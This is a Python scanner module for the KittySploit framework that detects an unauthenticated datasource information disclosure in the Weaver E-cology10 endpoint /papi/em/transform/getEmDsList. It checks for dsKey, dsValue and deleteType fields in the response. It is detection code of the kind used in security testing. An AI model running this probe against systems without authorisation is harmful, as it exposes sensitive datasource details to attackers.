#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Weaver E-cology10 contains a sensitive information disclosure vulnerability in the `/papi/em/transform/getEmDs."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Weaver E-cology getEmDsList Sensitive Information Disclosure Detection',
        'description': 'Weaver E-cology10 contains a sensitive information disclosure vulnerability in the `/papi/em/transform/getEmDsList` endpoint. An unauthenticated attacker can access the endpoint to retrieve datasource-related information such as `dsKey`, `dsValue`, and `deleteType`.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'weaver', 'ecology', 'ecology10', 'disclosure', 'exposure'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://mp.weixin.qq.com/s/tZvq6vlbDO1_eQHvX-bQbQ'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/papi/em/transform/getEmDsList', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"dsKey":', '"deleteType":', '"dsValue":',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Weaver E-cology getEmDsList Sensitive Information Disclosure detected",
                path='/papi/em/transform/getEmDsList',
            )
            return True
        return False

